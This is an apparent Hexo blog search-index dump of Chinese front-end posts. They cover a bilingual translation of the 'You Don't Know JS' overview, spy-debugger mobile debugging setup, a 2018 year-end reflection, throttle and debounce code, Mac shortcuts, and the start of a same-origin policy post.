scope.</p>\n<p>可能你最需要尽快明白的基本原理就是变量的作用域是如何在JS中工作的。仅仅只知道关于作用域模糊的概念是不够的。</p>\n<p>The Scope &amp; Closures title starts by debunking the common misconception that JS is an “interpreted language” and therefore not compiled. Nope.</p>\n<p>作用域 &amp; 闭包这一章节从揭示最常见的误解开始，JS是一门解释性语言，而不是被编译的。不对。</p>\n<p>The JS engine compiles your code right before (and sometimes during!) execution. So we use some deeper understanding of the compiler’s approach to our code to understand how it finds and deals with variable and function declarations. Along the way, we see the typical metaphor for JS variable scope management, “Hoisting.”</p>\n<p>JS引擎会对你的代码进行编译在你的代码执行之前(有时在执行时)。所以我们需要深入理解编译器处理我们代码的方式，以理解编译器如何找到并处理申明的变量和函数。沿着这条路，我们将见到js变量作用域管理特有的隐式提升。</p>\n<p>This critical(批评的、决定性的) understanding of “lexical(词汇) scope” is what we then base our exploration of closure on for the last chapter of the book. Closure is perhaps the single most important concept in all of JS, but if you haven’t first grasped(抓住、理会) firmly how scope works, closure will likely remain beyond your grasp.</p>\n<p>理解作用域这一关键词是至关重要的，在最后一张它是我们理解和探索闭包的基础。闭包可能是js所有概念中最重要之一，但是如果你第一次没有完全理解作用域的工作原理，闭包将会超越你的理解。</p>\n<p>One important application of closure is the module pattern, as we briefly introduced in this book in Chapter 2. The module pattern is perhaps the most prevalent code organization pattern in all of JavaScript; deep understanding of it should be one of your highest priorities.</p>\n<p>模块模式是闭包中一个重要的应用，我们在本书第二章会将会介绍它的基础概念。模块模式可能是所有js流行代码组织的模式。深入理解它应该是你最优先做的事情。</p>\n<h2 id=\"this-amp-Object-Prototypes\"><a href=\"#this-amp-Object-Prototypes\" class=\"headerlink\" title=\"this &amp; Object Prototypes\"></a>this &amp; Object Prototypes</h2><p>Perhaps one of the most widespread and persistent mistruths about JavaScript is that the this keyword refers to the function it appears in. Terribly mistaken.</p>\n<p>可能关于JS最普遍最持久的谬论是关键词this指代的是它的所出现的函数。可怕的谬论。</p>\n<p>The this keyword is dynamically bound based on how the function in question is executed, and it turns out there are four simple rules to understand and fully determine this binding.</p>\n<p>关键词this的指向动态的基于函数是如何执行的，是这里有四个简单的规则去理解和选择this绑定。</p>\n<p>Closely related to the this keyword is the object prototype mechanism, which is a look-up chain for properties, similar to how lexical scope variables are found. But wrapped up in the prototypes is the other huge miscue about JS: the idea of emulating (fake) classes and (so-called “prototypal”) inheritance.</p>\n<p>与this关键词密密相关的是object原型的原理，这是一个查找属性的链。与查询的方式相似。但是包含在原型中另一个JS的巨大谬论:模拟类和继承的想法</p>\n<p>Unfortunately, the desire to bring class and inheritance design pattern thinking to JavaScript is just about the worst thing you could try to do, because while the syntax may trick you into thinking there’s something like classes present, in fact the prototype mechanism is fundamentally opposite in its behavior.</p>\n<p>不幸的是，渴望将类和继承设计模式的想法带入JS将是你做的最糟糕的事情，因为将这种语法会使你认为有类的功能的存在，事实上原型原来是与类的概念是完全相反的。</p>\n<p>What’s at issue is whether it’s better to ignore the mismatch and pretend that what you’re implementing is “inheritance,” or whether it’s more appropriate to learn and embrace how the object prototype system actually works. The latter is more appropriately named “behavior delegation.”</p>\n<p>问题是忽略它的不匹配并且假装是在完成继承是否是一件好事，或者学习并拥抱对象属性系统工作方式是否合适。后者被称为行为系统更合适。</p>\n<p>This is more than syntactic preference. Delegation is an entirely different, and more powerful, design pattern, one that replaces the need to design with classes and inheritance. But these assertions will absolutely fly in the face of nearly every other blog post, book, and conference talk on the subject for the entirety of JavaScript’s lifetime.</p>\n<p>这不仅仅是语法上的偏好。委托是一种完全不同更强大的设计模式，一个可以替换了需要类和继承的设计。但是在javascript整个生命周期中在几乎所有博客的文章、书籍和会议讨论关于这个主题都是背道而驰的。</p>\n<p>The claims I make regarding delegation versus inheritance come not from a dislike of the language and its syntax, but from the desire to see the true capability of the language properly leveraged and the endless confusion and frustration wiped away.</p>\n<p>我对委托和继承做出的宣言不是源于对语言和其语法的厌恶，而是来自于渴望看到这门语言的真实力量被正确地利用，渴望看到无尽的困惑与沮丧被一扫而光。</p>\n<p>But the case I make regarding prototypes and delegation is a much more involved one than what I will indulge here. If you’re ready to reconsider everything you think you know about JavaScript “classes” and “inheritance,” I offer you the chance to “take the red pill” (Matrix 1999) and check out Chapters 4-6 of the this &amp; Object Prototypes title of this series.</p>\n<p>但是我讲的关于原型和委托例子比我在这里讲的涉及的还要多。如果你准备好重新思考你所认为关于JS中的类和继承,我将会提供给你这个机会去思考并改变，然后你可以查阅这一系列的this &amp; object prototype的第4-6章</p>\n<h2 id=\"Types-amp-Grammar\"><a href=\"#Types-amp-Grammar\" class=\"headerlink\" title=\"Types &amp; Grammar\"></a>Types &amp; Grammar</h2><p>The third title in this series primarily focuses on tackling yet another highly controversial topic: type coercion. Perhaps no topic causes more frustration with JS developers than when you talk about the confusions surrounding implicit coercion.</p>\n<p>在这一系列中的第三标题主要讨论另一个比较有争议的话题:强制类型转换。可能没有什么话题能比你讨论混乱的类型转换能让JS开发者更沮丧的话题了。</p>\n<p>By far, the conventional wisdom is that implicit coercion is a “bad part” of the language and should be avoided at all costs. In fact, some have gone so far as to call it a “flaw” in the design of the language. Indeed, there are tools whose entire job is to do nothing but scan your code and complain if you’re doing anything even remotely like coercion.</p>\n<p>到目前为止，传统的智慧是既然强制类型转换是这门医院糟糕的部分，我们应当不计一切的成本去避免他。事实上，一些人去称之为语言坏的一部分。事实上，已经有很多专门扫描代码的工具，当你的代码中使用了强制类型转换或者类似强制转换的事情将会报警。</p>\n<p>But is coercion really so confusing, so bad, so treacherous, that your code is doomed from the start if you use it?</p>\n<p>但是强制类型真的如此混乱、如此糟糕、如此不可靠，以致于你在代码中使用它就导致你的代码走向灭亡了吗？</p>\n<p>I say no. After having built up an understanding of how types and values really work in Chapters 1-3, Chapter 4 takes on this debate and fully explains how coercion works, in all its nooks and crevices. We see just what parts of coercion really are surprising and what parts actually make complete sense if given the time to learn.</p>\n<p>不是的，不是这样的。在第1-3章中讲解了类型和值真实是如何工作的，第4章参与了这个讨论，并从全面的角度分析强制类型是如何工作的。如果你花时间去学习它的话你回对强制类型转换感到惊奇并且是十分完整的。</p>\n<p>But I’m not merely suggesting that coercion is sensible and learnable, I’m asserting that coercion is an incredibly useful and totally underestimated tool that you should be using in your code. I’m saying that coercion, when used properly, not only works, but makes your code better. All the naysayers and doubters will surely scoff at such a position, but I believe it’s one of the main keys to upping your JS game.</p>\n<p>但是我不仅仅建议强制类型转换是明智的并且可学的，我声明强制类型转换是非常有用的，你应该使用你的代码而不是使用那些检测工具。我要说当你正常使用强制类型转换不仅仅可以工作还会使你的代码更好。所有的否定者和怀疑者毫无疑问将会嘲笑这个立场，但是我相信它将会是你玩好JS的主键之一。</p>\n<p>Do you want to just keep following what the crowd says, or are you willing to set all the assumptions aside and look at coercion with a fresh perspective? The Types &amp; Grammar title of this series will coerce your thinking.</p>\n<p>你是否还是坚持相信大多数人所说的，或者是说你已经将所有的猜想都放到一边。并且对强制转换有了一个新的观点？类型和语法这一章将会强制转换你思考。</p>\n<h2 id=\"Async-amp-Performance\"><a href=\"#Async-amp-Performance\" class=\"headerlink\" title=\"Async &amp; Performance\"></a>Async &amp; Performance</h2><p>The first three titles of this series focus on the core mechanics of the language, but the fourth title branches out slightly to cover patterns on top of the language mechanics for managing asynchronous programming. Asynchrony is not only critical to the performance of our applications, it’s increasingly becoming the critical factor in writability and maintainability.</p>\n<p>这一系列的第三个标题我们将主要关注这门语言的核心技术，但是第四个标题稍微扩展了一些，以涵盖用于管理异步编程的语言机制之上的模式。一部不是唯一评判我们应用性能的标砖，越来越多的评判因素是根绝可写性和可维护性。</p>\n<p>The book starts first by clearing up a lot of terminology and concept confusion around things like “async,” “parallel,” and “concurrent,” and explains in depth how such things do and do not apply to JS.</p>\n<p>这本书首次开始理清大量的属于和混乱的概念类似于:异步、同步、并行，深入的解释这些东西如何用或者不用再JS上。</p>\n<p>Then we move into examining callbacks as the primary method of enabling asynchrony. But it’s here that we quickly see that the callback alone is hopelessly insufficient for the modern demands of asynchronous programming. We identify two major deficiencies of callbacks-only coding: Inversion of Control (IoC) trust loss and lack of linear reason-ability.</p>\n<p>然后我们将思考为什么回调作为主要的方法实现异步，但是我们将很快的看到回调对于异步编程来说，仅仅依靠回调是不够的。我们确定了回调代码的两个不足。控制反转(IoC)信任缺失，缺乏线性推理能力。</p>\n<p>To address these two major deficiencies, ES6 introduces two new mechanisms (and indeed, patterns): promises and generators.</p>\n<p>为了解决这两大不足，est介绍了两种技术:promise和generators</p>\n<p>Promises are a time-independent wrapper around a “future value,” which lets you reason about and compose them regardless of if the value is ready or not yet. Moreover, they effectively solve the IoC trust issues by routing callbacks through a trustable and composable promise mechanism.</p>\n<p>promise是一个关于未来值的时间包装，它允许你组成并推理他们，无论值是否已准备好。并且，他们有效的解决了控制反转信任问题，通过可信任和可组合的promise机制路由回调。</p>\n<p>Generators introduce a new mode of execution for JS functions, whereby the generator can be paused at yield points and be resumed asynchronously later. The pause-and-resume capability enables synchronous, sequential looking code in the generator to be processed asynchronously behind the scenes. By doing so, we address the non-linear, non-local-jump confusions of callbacks and thereby make our asynchronous code sync-looking so as to be more reason-able.</p>\n<p>Generators介绍了一个行的JS函数执行模式，凭借generator能通过yield关键词暂停并且稍后重新开始异步。这种暂停和重新开始的异步能力，在后台异步处理生成器中的顺序查找代码。通过这样做，我们能处理回调函数的非线性、回调之间的混乱跳转。因此能够使我们的异步代码越来越同步和可靠。</p>\n<p>But it’s the combination of promises and generators that “yields” our most effective asynchronous coding pattern to date in JavaScript. In fact, much of the future sophistication of asynchrony coming in ES7 and later will certainly be built on this foundation. To be serious about programming effectively in an async world, you’re going to need to get really comfortable with combining promises and generators.</p>\n<p>但是yields结合了promise和generators是我们至今为止在JS中最有效的异步代码风格。事实上，不远将来，在es7或者后面版本中将会迎来更复杂的异步的，可以确定的是都将建立在这个基础之上。认真对待异步世界中的有效编程,你需要去适应promise和generator的混合。</p>\n<p>If promises and generators are about expressing patterns that let our programs run more concurrently and thus get more processing accomplished in a shorter period, JS has many other facets of performance optimization worth exploring.</p>\n<p>如果promise和generator是关于表达模式，使我们的程序能够更并发地运行，从而在更短的时间内完成更多的处理，JS有很多其他性能优化的内容值得探索。</p>\n<p>Chapter 5 delves into topics like program parallelism with Web Workers and data parallelism with SIMD, as well as low-level optimization techniques like ASM.js. Chapter 6 takes a look at performance optimization from the perspective of proper benchmarking techniques, including what kinds of performance to worry about and what to ignore.<br>第五章将进入并行主题的web工作和并行数据的SIMD，与低级别的压缩技术想ASM.js。第六章从基准技术来看一看性能优化，包括哪些性能是需要担忧的哪些是可以忽略的。</p>\n<p>Writing JavaScript effectively means writing code that can break the constraint barriers of being run dynamically in a wide range of browsers and other environments. It requires a lot of intricate and detailed planning and effort on our parts to take a program from “it works” to “it works well.”</p>\n<p>编写有效的javascript意味着编写能够打破能动态运行在大多数浏览器和其他环境的障碍。它能工作到它能工作的很好，需要很多复杂详细的计划和努力。</p>\n<p>The Async &amp; Performance title is designed to give you all the tools and skills you need to write reasonable and performant JavaScript code.</p>\n<p>这异步和性能标题是为了给你需要编写合理和高性能的js代码所需要的工具和技能。</p>\n<p>ES6 &amp; Beyond<br>No matter how much you feel you’ve mastered JavaScript to this point, the truth is that JavaScript is never going to stop evolving, and moreover, the rate of evolution is increasing rapidly. This fact is almost a metaphor for the spirit of this series, to embrace that we’ll never fully know every part of JS, because as soon as you master it all, there’s going to be new stuff coming down the line that you’ll need to learn.</p>\n<p>无论你感觉你多精通javascript，真理是javascript绝不停止更新，而且，更新的速度变得越来越快。事实从这一系列去拥抱我们踊跃都不可能知道Js的所有部分，因为你不可能精通它所有的部分，很快就可能有新的功能你需要去学习的。</p>\n<p>This title is dedicated to both the short- and mid-term visions of where the language is headed, not just the known stuff like ES6 but the likely stuff beyond.</p>\n<p>这个标题是专注于这门语言短期和中期房展方向的，不仅仅知道es6这样的东西还有其他可能得东西</p>\n<p>While all the titles of this series embrace the state of JavaScript at the time of this writing, which is mid-way through ES6 adoption, the primary focus in the series has been more on ES5. Now, we want to turn our attention to ES6, ES7, and …</p>\n<p>而本系列的所有标题包含了这一时期协作的javascript状态，哪些中等方法通过了es6的采用，着一些列主要关注更多的在于es5，现在我们将要转变我们的注意到es6、es7更多</p>\n<p>Since ES6 is nearly complete at the time of this writing, ES6 &amp; Beyond starts by dividing up the concrete stuff from the ES6 landscape into several key categories, including new syntax, new data structures (collections), and new processing capabilities and APIs. We cover each of these new ES6 features, in varying levels of detail, including reviewing details that are touched on in other books of this series.</p>\n<p>因为在写作之时es6已经接近完成，es6和beyond开始分割es6功能为几个关键分类，包括新的预发，新的数据结果和新的处理能力和api。我们覆盖了所有新的es6功能，在不变的详细等级，包括在这一系列的其他书上触摸到的细节。</p>\n<p>Some exciting ES6 things to look forward to reading about: destructuring, default parameter values, symbols, concise methods, computed properties, arrow functions, block scoping, promises, generators, iterators, modules, proxies, weakmaps, and much, much more! Phew, ES6 packs quite a punch!</p>\n<p>一些令人兴奋盼望去阅读的es6事物:解构、参数默认值、符号、简单方法、计算属性、箭头函数、块作用域、承诺、生成器、遍历、模块化、代理。es6很有冲击力</p>\n<p>The first part of the book is a roadmap for all the stuff you need to learn to get ready for the new and improved JavaScript you’ll be writing and exploring over the next couple of years.</p>\n<p>本书的第一部分是一张路线图，列出了你所有需要学习的内容。为了在未来几年编写和研究新的javascript内容和改进javascript做好准备。</p>\n<p>The latter part of the book turns attention to briefly glance at things that we can likely expect to see in the near future of JavaScript. The most important realization here is that post-ES6, JS is likely going to evolve feature by feature rather than version by version, which means we can expect to see these near-future things coming much sooner than you might imagine.</p>\n<p>本书的最后一部分转变注意力到，简单浏览一下在不远将来我们能在javascript中看到的内容。es6的发布是最重要的关系，JS看起来就像进入了一个功能接一个功能一个版本接一个版本。这意味着我们能探索的不远将来的事情很快就会到来，比你想象的还要快。</p>\n<p>The future for JavaScript is bright. Isn’t it time we start learning it!?</p>\n<p>Javascript的未来是明亮的。现在不是我们开始学习的时候了吗？</p>\n<p>Review<br>The YDKJS series is dedicated to the proposition that all JS developers can and should learn all of the parts of this great language. No person’s opinion, no framework’s assumptions, and no project’s deadline should be the excuse for why you never learn and deeply understand JavaScript.</p>\n<p>你不懂js系列是专注于所有JS开发者能并且应该学习这一伟大语言的所有部分的这一命题。没有个人之见，没有框架假设，没有项目期限能成为你为什么学习并且深入理解javascript的原因。</p>\n<p>We take each important area of focus in the language and dedicate a short but very dense book to fully explore all the parts of it that you perhaps thought you knew but probably didn’t fully.</p>\n<p>我们谈论这门语言应该关注的重点地方并且致力于简短，但是非常浓密的书去充分探索有可能认为你知道倒是可能不全面的所有部分。</p>\n<p>“You Don’t Know JS” isn’t a criticism or an insult. It’s a realization that all of us, myself included, must come to terms with. Learning JavaScript isn’t an end goal but a process. We don’t know JavaScript, yet. But we will!</p>\n<p>你不懂JS不是批评和侮辱。这是我们所有人人认知的，我自己也不例外。学习javascript不是一个最终目标但是是一个过程。我们不懂javascript，但是我们将会懂得。</p>\n","categories":["js"],"tags":["book"]},{"title":"spy-debugger","url":"http://zhoushaw.github.io/2019/02/04/learning/font-end/debugger/spy-debugger/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>移动端web调试十分麻烦，chrome调试工具不支持ios，在ios端出现兼容问题将十分难易调试，普通的log方式调试时间大量损耗，有没有一个方便易用的方式呢，spy-debugger可以很好的解决的这个问题，跨多端webview调试也非常方便快捷</p>\n<div><a id=\"more\"></a></div>\n\n<h2 id=\"起步\"><a href=\"#起步\" class=\"headerlink\" title=\"起步\"></a>起步</h2><blockquote>\n<p>安装</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install spy-debugger -g</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>启动</p>\n</blockquote>\n<p><code>spy-debugger</code></p>\n<blockquote>\n<p>环境配置</p>\n</blockquote>\n<p>手机与pc保持同一个局域网<br>ios代理设置:设置 - 无线局域网 - 选中网络 - HTTP代理手动</p>\n<p>代理配置信息为，启动命令行窗口中会暴露ip地址和端口号</p>\n<blockquote>\n<p>安装正式</p>\n</blockquote>\n<p>浏览器访问:<a href=\"http://s.xxx(真实域名就是这个不用怀疑)\" target=\"_blank\" rel=\"noopener\">http://s.xxx(真实域名就是这个不用怀疑)</a><br>按照操作步骤完成安装，</p>\n<blockquote>\n<p>信任证书</p>\n</blockquote>\n<p>1.设置 - 通用 - 证书信任设置 - 设置node-mitmproxy为信任证书<br>2.设置 - 通用 - 关于手机 - 证书信任设置 - 设置node-mitmproxy为信任证书</p>\n","categories":["debugger"],"tags":["debugger"]},{"title":"2018年终总结","url":"http://zhoushaw.github.io/2019/01/09/2018总结/","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Hi,我在浙江杭州，现在是北京时间2019.1.9 10:17，这里是一份晚到的年终总结。年终这段时间非常忙，很想提笔写下这一年，但始终抽不出时间(就是懒)。</p>\n<p>从2018-2019更多的是心态上的转变，从实习开始算起，满打满算已经工作一年时间了。从学校到社会看到了完备的工程体系，看到了以后的生活和未来。</p>\n<div><a id=\"more\"></a></div>\n\n<p>来杭已快半年了，2018年从学生完成了一个社会人的转变，细想2018年初立下的flag好像没并完成几个🤣。</p>\n<blockquote>\n<p>2018年初立下的flag:</p>\n</blockquote>\n<ul>\n<li>英语水平六级以上，技术文章视频听写无阻碍</li>\n<li>技术广度提升，包括但不限于前端技术:nodeJs、ReactNative、Python</li>\n<li>做几个有技术水平的开源项目</li>\n<li>健身、身体素质水平提升(毕竟身体才是革命的本钱)</li>\n<li>技术深度提升:研究Vue源码、React源码，基础变得更加牢固</li>\n</ul>\n<p>细想过去的一年并未发现自己有太大的成长，也没有从想象的初级程序员迈向高级工程师，英语水平也没有明显提升，技术广度和深度也没有太大提升。不过值得庆幸来到蘑菇街看到了更完善的工程体系，身体素质也逐渐恢复到了一个正常水平(被上一家公司摧残了🤣)。</p>\n<p>从事前端工作已经接近一年了，我在想这是我当初入行前端的初心吗，每天编写业务代码，做着重复的工作。生活并没有我想想的那样富有创造力，如何重新找回对技术的激情呢。</p>\n<h3 id=\"新年展望\"><a href=\"#新年展望\" class=\"headerlink\" title=\"新年展望\"></a>新年展望</h3><p>算了年终总结应该按照惯例立下新年flag(希望今年年底不会被打肿脸):</p>\n<blockquote>\n<p>需要看完的书籍:</p>\n</blockquote>\n<ul>\n<li><p>技术类</p>\n<ul>\n<li>你不知道的javascript</li>\n<li>javascript函数编程指南</li>\n<li>javascript高级程序设计</li>\n<li>javascript设计模式</li>\n<li>css世界</li>\n<li>计算机网络</li>\n<li>编译原理</li>\n<li>计算机组成原理</li>\n</ul>\n</li>\n<li><p>其他类型</p>\n<ul>\n<li>人类简史</li>\n<li>流浪地球</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>需要学习的新技术:</p>\n</blockquote>\n<ul>\n<li>flutter</li>\n<li>Electron</li>\n<li>WebAssembly</li>\n<li>chrome插件开发</li>\n</ul>\n<p>至少看完十本:</p>\n<ul>\n<li>三体</li>\n<li>人类简史</li>\n</ul>\n<blockquote>\n<p>新的语言</p>\n</blockquote>\n<ul>\n<li>C++</li>\n<li>Java</li>\n</ul>\n<blockquote>\n<p>生活方面</p>\n</blockquote>\n<ul>\n<li>今年存款7万+吧</li>\n<li>拿到驾照</li>\n<li>带她回家见家长</li>\n</ul>\n<h2 id=\"过去一年的回顾\"><a href=\"#过去一年的回顾\" class=\"headerlink\" title=\"过去一年的回顾\"></a>过去一年的回顾</h2><p>值得庆幸的是从深圳到杭州，来到蘑菇街，加入了自己期待的团队，但成长一直都是属于自己的事情，无论身边人多么优秀一切都需要靠自己。19年想提醒自己最终要的一件事情:带脑子干活，从项目设计到最终落地，一定要时刻保持紧张、紧迫感，敬畏每一行代码，因为你永远不知道你认为的一行简单的代码会带来多大的灾难。</p>\n<p>18年没有发生大事故值得庆幸，在支付团队的时候，在现金贷业务中导致了一大批风险用户放款成功，虽然后端主要责任，但作为项目的前端开发也没有做到及时发现风险，导致后面大批风险用户借款成功。还好后面风险用户跟进发现数据十分正常，还好在贷前风控做的不错，不然真算的上是P0级别的事故了。</p>\n<p>18年11月份中旬的时候，从支付部门转到了主站。原来的闲鱼生活彻底消失了，就一个忙~，忙碌的生活让自己没法🤔,怎么样才能让自己有充足的时间思考并提升呢,19年可能要从以下几方面入手:</p>\n<ul>\n<li>需求提审前做足功课，分析所有的技术难点，需求优化，在不影响功能的同时提升生产效率</li>\n<li>排期合理化，不要让自己想18年年末那样忙死忙活的把需求赶出来，毕竟老大都说不要加班了~</li>\n<li>多总结，既然需求多那就从做需求中学习吧，逐步提升开发效率，遇到问题及时记录并深究问题出现的原因及背后一系列的技术点</li>\n</ul>\n<p>最想要提升的英语方面并没有很大的提升😢，19年想在这方面加强。毕竟做软件开发不能只提升技术方面的知识，软实力也相当重要，在19年有哪些软实力需要提升的呢，英语方面的能力、阅读能力、写作能力、沟通交流能力，只要把这几方面的基础能力提升、加强，在后面的工作生活中才能走的更稳健。</p>\n","categories":["life"],"tags":["life"]},{"title":"throttle 和 debounce","url":"http://zhoushaw.github.io/2018/10/23/learning/font-end/js/throttle 和 debounce/","content":"<blockquote>\n<p>throttle 和 debounce是控制频率的高阶函数，返回一个包装后的匿名函数</p>\n</blockquote>\n<p>在实际工作中的很多场景下都会使用到这两个高阶函数，并且在javascript中利用了闭包这一特性。下面对这两个函数进行详细讲解<br>应用场景:</p>\n<ul>\n<li>resize 重新计算样式布局   –debounce</li>\n<li>input输入停止1s时，获取ajax请求     –debounce</li>\n<li>scroll 计算当前是否大于固定值，显示头部   –throttle<div><a id=\"more\"></a></div>\n\n\n</li>\n</ul>\n<h2 id=\"throttle\"><a href=\"#throttle\" class=\"headerlink\" title=\"throttle\"></a>throttle</h2><p>throttle也可以称之为节流函数，主要用于控制一段时间内，只允许执行一次指定函数。类似于打开阀门的水龙头，每过固定的时间内，滴出不超过一滴水</p>\n<p>主要场景用于:</p>\n<ul>\n<li>scroll</li>\n<li>resize</li>\n<li>mouse move</li>\n</ul>\n<p>在我们的实际工作中，基于性能和效率上的考虑，要限制函数的执行频率可以使用throttle</p>\n<p>以地铁为例进行说明:</p>\n<p>某个函数去乘坐地铁，必须等待🚇到站后，才能上车。🚇到站函数可以上车，但在固定时间点后，不管有没有人继续上车，🚇将会发车。</p>\n<p>在实际工作中的应用，列如:</p>\n<p>淘宝网需要在用户滑动滚轮，距离顶部500px时，隐藏顶部导航栏，这个时候我们需要对用户的滑动事件进行监听，当用户进行滑动时，我们可以获取到用户当前滑动的距离，与500px进行比较。当用户的滑动距离大于等于500时，执行隐藏操作。</p>\n<p>通常实现:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.addEventListener(&quot;scroll&quot;, () =&gt; &#123;</span><br><span class=\"line\">    let scrollTop = document.documentElement.scrollTop</span><br><span class=\"line\">    if (scrollTop &gt;= 500) &#123;</span><br><span class=\"line\">       // 隐藏头部逻辑</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p>但是滚动事件的触发频率非常高，这样将会造成性能上的浪费，我们可以通过throttle函数来控制频率，我们可以控制用户在滚动滚轮时，在500毫秒内只触发一次检测，当前用户距离是否距离顶部大于等于500</p>\n<p>具体实现:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># throttle函数</span><br><span class=\"line\">function throttle(fn,delay = 250)&#123;</span><br><span class=\"line\">    let timer;</span><br><span class=\"line\">    let last;</span><br><span class=\"line\">    </span><br><span class=\"line\">    return function () &#123;</span><br><span class=\"line\">        let now = +new Date();</span><br><span class=\"line\">        if (last &amp;&amp; last + delay &gt; now) &#123;</span><br><span class=\"line\">            clearTimeout(timer);</span><br><span class=\"line\">            timer = setTimeout(function () &#123;</span><br><span class=\"line\">                last = now;</span><br><span class=\"line\">                fn.apply(this, arguments);</span><br><span class=\"line\">            &#125;,delay)</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            last = now;</span><br><span class=\"line\">            fn.apply(this, arguments);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"debounce\"><a href=\"#debounce\" class=\"headerlink\" title=\"debounce\"></a>debounce</h2><p>debounce更类似于按压的弹簧，当你用力按压时，弹簧是不会弹起的。也可以比喻成电梯，电梯在一层停留时，只要有人进入就会一直陷入等待进入状态，等到没有人进入时就会移动。</p>\n<p>例:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以输入框的输入事件为例，淘宝网有一个银行卡添加页面，当用户在输入框输入银行卡时，会通过ajax请求获取当前银行卡类型，并检测是否支持。若用户每输入一个数字就进行校验，会造成性能上的浪费，可以通过debounce防抖函数，设置用户停止输入一秒后，对银行卡进行校验识别。</span><br></pre></td></tr></table></figure>\n<p>具体实现:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function debounce(fn, delay = 1000) &#123;</span><br><span class=\"line\">    var timer;</span><br><span class=\"line\">    var context = this;</span><br><span class=\"line\">    return function() &#123;</span><br><span class=\"line\">        if (timer) &#123;</span><br><span class=\"line\">            clearTimeout(timer);</span><br><span class=\"line\">            timer = setTimeout(function() &#123;</span><br><span class=\"line\">                fn.apply(context,arguments);</span><br><span class=\"line\">            &#125;, delay)</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            timer = setTimeout(function() &#123;</span><br><span class=\"line\">                fn.apply(context,arguments);</span><br><span class=\"line\">            &#125;, delay)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","categories":["js"],"tags":["js"]},{"title":"mac效率","url":"http://zhoushaw.github.io/2018/10/14/other/tool/mac效率/","content":"<h2 id=\"快捷键\"><a href=\"#快捷键\" class=\"headerlink\" title=\"快捷键\"></a>快捷键</h2><ul>\n<li>使用快捷键 <code>Command+M</code>，可以实现快速<strong>最小化当前窗口</strong>的目的。</li>\n<li>使用快捷键 <code>Command+Option+M</code>，可以实现快速<strong>最小化当前应用程序所有窗口</strong>的目的。比如你想一下子最小化多个 Finder 窗口，就可以用该快捷键。</li>\n<li>使用快捷键 <code>Command+H</code>，可以实现快速<strong>隐藏当前应用程序所有窗口</strong>的目的。</li>\n<li>使用快捷键 <code>Command+Option+H</code>，可以实现<strong>快速隐藏除当前应用程序之外所有程序窗口</strong>的目的。</li>\n<li>使用快捷键 <code>Command+Option+M+H</code>，可以实现快速<strong>隐藏所有应用程序窗口</strong>的目的。</li>\n<li>你还可以在「<strong>系统偏好设置——通用</strong>」中勾选”连按窗口的标题栏以将窗口最小化”，然后双击窗口标题栏就可以最小化当前窗口。</li>\n</ul>\n<h2 id=\"高效常用软件\"><a href=\"#高效常用软件\" class=\"headerlink\" title=\"高效常用软件\"></a>高效常用软件</h2><p>markdown神器：mweb<br>效率神器：alfred</p>\n","categories":["tool"],"tags":["tool"]},{"title":"http","url":"http://zhoushaw.github.io/2018/09/30/learning/font-end/js/CORS/","content":"<h2 id=\"同源策略\"><a href=\"#同源策略\" class=\"headerlink\" title=\"同源策略\"></a>同源策略</h2><p>在了解跨域问题前，先对同源策略进行一个回顾</p>\n<blockquote>\n<p>同源策略</p>\n</blockquote>\n<ul>\n<li>同源策略是网景公司提出的著名的安全策略</li>\n<li>现代浏览器构建都基于同源策略</li>\n<li>web构建在同源策略基础之上，对非同源的脚本限制就是同源策略的实现</li>\n<li>同源指的是，协议、域名、端口三者相同称之为同源，任一不相同，则不同源</li>\n</ul>\n<div><a id=\"more\"></a></div>\n\n<blockquote>\n<p>同源策略的限制规则</p>\n</blockquote>\n<ul>\n<li>DOM层面<ul>\n<li>限制了不同域的docuemnt对象，或js脚本禁止对当前域的document对象或属性进行修改</li>\n</ul>\n</li>\n<li><p>Cookie(localstorage和IndeIndexDB也包含)    